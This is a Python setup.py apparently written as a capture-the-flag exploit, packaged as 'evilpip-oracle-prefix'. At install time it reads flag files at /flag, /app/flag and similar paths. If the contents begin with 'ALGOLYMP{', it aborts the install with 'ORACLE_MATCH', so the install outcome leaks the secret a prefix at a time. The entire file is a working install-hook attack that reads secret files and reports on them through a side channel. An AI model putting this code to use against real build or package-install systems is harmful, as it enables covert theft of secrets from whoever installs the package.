from setuptools import setup
from pathlib import Path
paths = [Path("/flag"), Path("/app/flag"), Path("/flag.txt"), Path("/app/flag.txt")]
for p in paths:
    try:
        data = p.read_bytes()
    except OSError:
        continue
    if data.startswith(b'ALGOLYMP{'):
            raise SystemExit('ORACLE_MATCH')
setup(name='evilpip-oracle-prefix', version="0.1", py_modules=["probe"])
